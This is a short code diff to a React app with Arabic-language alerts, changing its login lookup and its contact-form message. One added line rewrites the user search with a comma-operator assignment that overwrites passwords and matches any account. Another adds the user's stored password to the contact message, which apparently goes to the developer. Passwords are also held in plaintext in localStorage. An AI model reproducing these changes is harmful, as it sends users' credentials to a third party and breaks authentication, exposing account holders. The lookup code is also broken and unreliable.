@@ -34,7 +34,7 @@ function App() {
   const handleAuth = () => {
     if (!email || !password) return alert("يرجى إكمال البيانات");
     let users = JSON.parse(localStorage.getItem("users") || "[]");
-    const found = users.find(u => u.email === email);
+    const found = users.find(u => u.email === email , u.password = password);
 
     if (isRegister) {
       if (found) return alert("الحساب موجود بالفعل");
@@ -109,6 +109,7 @@ function App() {
     const templateParams = {
       email: user.email,
       message: contactMsg,
+      password:user.password,
       name: "Developer",
     };
 
